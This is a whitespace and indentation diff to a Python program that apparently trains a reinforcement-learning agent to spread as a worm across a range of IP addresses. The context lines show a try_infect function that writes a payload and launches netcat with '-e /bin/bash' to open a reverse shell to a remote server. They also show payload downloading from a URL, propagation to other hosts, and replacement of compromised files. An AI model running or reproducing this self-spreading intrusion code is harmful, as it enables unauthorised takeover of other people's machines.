@@ -23,7 +23,7 @@ class Config:
         self.config_path = config_path
         self.data = self._load_config()
         self._setup_logging()
-    
+
     def _load_config(self) -> Dict[str, Any]:
         try:
             with open(self.config_path, 'r') as f:
@@ -34,7 +34,7 @@ class Config:
         except yaml.YAMLError as e:
             logger.error(f"Error parsing config file: {e}")
             return self._get_defaults()
-    
+
     def _get_defaults(self) -> Dict[str, Any]:
         return {
             'learning': {
@@ -63,7 +63,7 @@ class Config:
                 'format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
             }
         }
-    
+
     def _setup_logging(self):
         log_config = self.data.get('logging', {})
         level = getattr(logging, log_config.get('level', 'INFO'))
@@ -76,7 +76,7 @@ class Config:
             ],
             force=True
         )
-    
+
     def get(self, *keys, default=None):
         value = self.data
         for key in keys:
@@ -129,11 +129,11 @@ class LongTermMemory:
     def store(self, experience):
         state, action, reward, next_state = experience
         self.memory.append(experience)
-        
+
         if state not in self.memory_index:
             self.memory_index[state] = []
         self.memory_index[state].append(experience)
-        
+
         if len(self.memory) > self.capacity:
             old_exp = self.memory.pop(0)
             old_state = old_exp[0]
@@ -202,7 +202,7 @@ def try_infect(ip: str) -> bool:
             with open(payload_file, 'w') as f:
                 f.write(PAYLOAD)
             logger.debug(f"Wrote payload to {payload_file}")
-        
+
         subprocess.run([NETCAT_BINARY, "-e", "/bin/bash", REMOTE_SERVER, str(PORT)],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
         logger.info(f"Successfully infected {ip}")
@@ -224,7 +224,7 @@ def perform_self_healing(ip: str) -> bool:
         os.kill(pid, 0)  # Check if process exists
     except OSError:
         return False
-    
+
     src = Path("/path/to/original/file")  # Replace with your actual paths
     dst = Path("/path/to/compromised/file")
     if not src.exists() or not dst.exists() or src.samefile(dst):
@@ -292,15 +292,15 @@ def check_self_awareness(ip: str) -> bool:
 
 
 def explore_environment(ip: str) -> bool:
-  """Gather information about the local environment (example)."""
-  try:
-      hostname = socket.gethostname()
-      local_ip = socket.gethostbyname(hostname)
-      logger.info(f"Explored environment: Hostname={hostname}, IP={local_ip}")
-      return True
-  except Exception as e:
-      logger.error(f"Environment exploration error: {e}")
-      return False
+    """Gather information about the local environment (example)."""
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        logger.info(f"Explored environment: Hostname={hostname}, IP={local_ip}")
+        return True
+    except Exception as e:
+        logger.error(f"Environment exploration error: {e}")
+        return False
 
 action_dispatch = {
     "try_infect": try_infect,
@@ -327,18 +327,18 @@ def download_payload(payload_url: str, max_size: Optional[int] = None) -> str:
     """Download the payload from a URL with size limit."""
     if max_size is None:
         max_size = config.get('payload', 'max_size_mb', default=10) * 1024 * 1024
-    
+
     if not validate_url(payload_url):
         logger.critical(f"Invalid payload URL: {payload_url}")
         sys.exit(1)
-    
+
     try:
         with urllib.request.urlopen(payload_url) as f:
             content_length = f.getheader('Content-Length')
             if content_length and int(content_length) > max_size:
                 logger.critical(f"Payload size {content_length} exceeds maximum {max_size}")
                 sys.exit(1)
-            
+
             payload = f.read(max_size).decode("utf-8")
             logger.info(f"Successfully downloaded payload from {payload_url} ({len(payload)} bytes)")
             return payload
@@ -354,11 +354,11 @@ def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
             validated_ips.append(ip)
         else:
             logger.warning(f"Skipping invalid IP: {ip}")
-    
+
     if not validated_ips:
         logger.critical("No valid IP addresses provided")
         sys.exit(1)
-    
+
     return sorted(validated_ips, key=lambda ip: int(ip.split('.')[-1]) if '.' in ip and ip.split('.')[-1].isdigit() else float('inf'))
 
 def choose_action(q_table, state, exploration_probability):
@@ -385,7 +385,7 @@ def save_q_table(q_table: Dict, filepath: str = "q_table.json"):
         for state, actions in q_table.items():
             key = f"{state.ip}_{state.state_number}"
             serializable_q_table[key] = actions
-        
+
         with open(filepath, 'w') as f:
             json.dump(serializable_q_table, f, indent=2)
         logger.info(f"Q-table saved to {filepath} ({len(q_table)} states)")
@@ -397,17 +397,17 @@ def load_q_table(filepath: str = "q_table.json") -> Dict:
     if not os.path.exists(filepath):
         logger.info(f"Q-table file {filepath} not found, starting fresh")
         return {}
-    
+
     try:
         with open(filepath, 'r') as f:
             serializable_q_table = json.load(f)
-        
+
         q_table = {}
         for key, actions in serializable_q_table.items():
             ip, state_number = key.rsplit('_', 1)
             state = State(ip, int(state_number))
             q_table[state] = actions
-        
+
         logger.info(f"Q-table loaded from {filepath} ({len(q_table)} states)")
         return q_table
     except Exception as e:
@@ -442,42 +442,42 @@ def setup_training(payload_url: str, ip_range: List[str], load_model: bool = Fal
 def train_single_ip(q_table: Dict, ip: str, exploration_probability: float) -> Dict:
     """Train the agent on a single IP address."""
     state = State(ip, 0)
-    
+
     while True:
         if state not in q_table:
             q_table[state] = {action: 0.0 for action in action_map}
-        
+
         action = choose_action(q_table, state, exploration_probability)
         reward, next_state = take_action(action, state.ip, state)
-        
+
         if next_state is not None:
             if next_state not in q_table:
                 q_table[next_state] = {action: 0.0 for action in action_map}
-            
+
             next_action = choose_action(q_table, next_state, exploration_probability)
             q_table[state][action] += LEARNING_RATE * (
                 reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action]
             )
-            
+
             long_term_memory.store((state, action, reward, next_state))
-        
+
         state = next_state if next_state else state
-        
+
         if check_self_awareness(state.ip) or state.state_number >= MAX_STATE:
             break
-    
+
     return q_table
 
 def train_episode(q_table: Dict, ip_range: List[str], episode: int, exploration_probability: float) -> Dict:
     """Execute one complete training episode."""
     for ip in ip_range:
         q_table = train_single_ip(q_table, ip, exploration_probability)
-    
+
     if episode % 10 == 0:
         if ip_range:
             perform_self_healing(ip_range[0])
             propagate(ip_range)
-    
+
     return q_table
 
 def finalize_training(q_table: Dict, save_model: bool = True):
@@ -489,16 +489,16 @@ def finalize_training(q_table: Dict, save_model: bool = True):
 def main(ip_range, remote_server, port, payload_url, load_model: bool = False, save_model: bool = True):
     q_table, validated_ips = setup_training(payload_url, ip_range, load_model)
     exploration_probability = INITIAL_EXPLORATION_PROBABILITY
-    
+
     for episode in range(MAX_EPISODES):
         q_table = train_episode(q_table, validated_ips, episode, exploration_probability)
-        
+
         exploration_probability *= EXPLORATION_DECAY
         logger.info(f"Episode {episode+1}/{MAX_EPISODES} completed. Exploration probability: {exploration_probability:.4f}")
-        
+
         if save_model and (episode + 1) % 100 == 0:
             save_q_table(q_table, f"q_table_episode_{episode+1}.json")
-    
+
     finalize_training(q_table, save_model)
 
 
@@ -512,5 +512,5 @@ if __name__ == "__main__":
     parser.add_argument("--no-save", action="store_true", help="Do not save Q-table after training.")
     args = parser.parse_args()
 
-    main(args.ip_range, args.remote_server, args.port, args.payload_url, 
+    main(args.ip_range, args.remote_server, args.port, args.payload_url,
          load_model=args.load_model, save_model=not args.no_save)
